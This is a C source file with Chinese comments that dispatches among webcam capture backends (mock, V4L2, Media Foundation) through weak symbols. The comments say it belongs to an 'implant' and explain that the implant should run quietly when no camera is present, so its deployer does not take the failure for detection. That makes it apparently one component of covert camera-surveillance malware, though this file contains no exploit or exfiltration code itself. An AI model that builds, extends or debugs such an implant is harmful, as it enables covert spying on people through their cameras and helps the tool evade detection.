/*
 * agent_windows/src/cam_factory.c
 *
 * 采集后端统一工厂。
 *
 * 为什么需要这一层（修掉的历史缺陷）：
 *   cam_mock.c / cam_linux_v4l2.c / cam_mf.cpp 三个文件此前各自导出一份
 *   cam_source_create。它们是互斥的——同一条链接里只能出现其中一个，否则
 *   重复符号。于是"用哪个后端"不是运行时选择，而是由 Makefile 决定把哪个
 *   .o 链进去。后果有三：
 *
 *     1. Linux 真机想走 V4L2，必须把 cam_mock.o 摘掉；而摘掉后所有
 *        cam_source_create("mock") 的既有测试全部失效。二者不可兼得。
 *     2. Windows 链的 Makefile 注释里写着"cam_mf.o 与 cam_mock.o 同链会
 *        重复定义"——这条约束靠人工遵守，没有任何机制保证。
 *     3. 新增后端只能继续沿用"再定义一个同名函数、靠链接选择"的模式，
 *       脆弱性会随后端数量线性累积。
 *
 *   本文件把"分发"从链接期提到运行期：各后端改为导出各自的具体构造函数，
 *   工厂按 backend 字符串选择。于是三个后端可以同时存在于一条链接里，
 *   既有测试（显式要 "mock"）与真机路径（显式要 "v4l2"）不再互相排斥。
 *
 * 自动选择（backend == NULL）的语义：
 *   Linux   -> v4l2（内部已有降级：无 /dev/video* 时自动走合成帧，
 *              因此不会因换默认后端而让沙盒/CI 崩掉）
 *   Windows -> mf
 *   其他    -> mock
 *
 *   注意：自动选择失败时回落到 mock，而不是返回 NULL。植入体在"没有真设备"
 *   的环境里应当安静地跑通流程（合成帧），而不是在 implant_create 阶段就
 *   失败——那会让部署方误判为"被检测/被拒绝"。真正的"无设备"判定在
 *   ST_INIT 的 enumerate 里做，返回 IMPLANT_ERR_NO_DEVICE。
 */

#include <string.h>

#include "camera.h"

/* 各后端的具体构造函数。
 *
 * 声明为 weak：静态链接要求目标文件里每个未定义符号都被解析，哪怕那条分支
 * 运行时永远不会走到。winshim 链只链 cam_mf.o，若这里硬引用 mock/v4l2 的
 * 构造函数，链接器就会报 undefined reference——尽管那条路径根本不会执行。
 *
 * weak 让"未链入的后端"解析为 NULL，由下面的判空决定行为。于是一份
 * cam_factory.c 能无条件编译进所有平台，不必为每个链接组合写条件编译。 */
/* extern "C" 不可省。
 *
 * 本文件在 winshim 链里被 -x c++ 编译（与 shim 的 C++ 源码共存）。C++ 会对
 * 函数名做 name mangling，于是这三个引用变成 _Z21cam_source_create_mfv 之类，
 * 与各后端 extern "C" 导出的纯 C 符号 cam_source_create_mf 不匹配。
 *
 * 症状极隐蔽：weak 未解析时链接器不报错（约定解析为 0），运行期构造判空
 * 命中 NULL 分支，cam_source_create("mf") 返回 NULL —— 而 cam_source_create
 * 自身因为 camera.h 有 extern "C" 保护、链接正常，所以整条链毫无告警。
 * 实跑 winshim-build 才暴露（test_mf_logic 0 pass 1 fail）。 */
#ifdef __cplusplus
extern "C" {
#endif

extern cam_source_t *cam_source_create_mock(void) __attribute__((weak));
extern cam_source_t *cam_source_create_v4l2(void) __attribute__((weak));
extern cam_source_t *cam_source_create_mf(void)   __attribute__((weak));

#ifdef __cplusplus
}
#endif

cam_source_t *cam_source_create(const char *backend)
{
    /* 显式指定优先，不做隐式猜测——猜错会采到假帧而调用方毫无察觉 */
    if (backend && backend[0]) {
        if (strcmp(backend, "mock") == 0)
            return cam_source_create_mock ? cam_source_create_mock() : NULL;
        if (strcmp(backend, "v4l2") == 0 || strcmp(backend, "synthetic") == 0)
            return cam_source_create_v4l2 ? cam_source_create_v4l2() : NULL;
        if (strcmp(backend, "mf") == 0)
            return cam_source_create_mf ? cam_source_create_mf() : NULL;
        /* 未知名字：不静默回落。回落会让拼错的 backend 表现为"合成帧在跑"，
         * 部署方以为是真机画面，实际一直是假帧——这正是最难排查的一类失效。 */
        return NULL;
    }

    /* 自动选择。判空不可省：weak 符号在对应后端未链入时为 NULL，直接调用
     * 是跳到 0 地址。 */
#if defined(_WIN32)
    if (cam_source_create_mf)   return cam_source_create_mf();
#elif defined(__linux__)
    if (cam_source_create_v4l2) return cam_source_create_v4l2();
#endif
    return cam_source_create_mock ? cam_source_create_mock() : NULL;
}

void cam_source_destroy(cam_source_t *src)
{
    if (!src) return;

    if (src->destroy) {
        src->destroy(src);      /* 后端自带析构，知道该用什么释放 */
        return;
    }

    /* 后端未设置 destroy（第三方后端或尚未改造的旧后端）：只做保守的 close。
     *
     * 刻意不猜测该用 free 还是 CoTaskMemFree——猜错是内存破坏，比泄漏严重
     * 得多，而且症状（堆损坏）往往在很久以后才现形，无法定位到此处。宁可
     * 泄漏一个对象，也不引入非确定性崩溃。 */
    if (src->close) src->close(src);
}
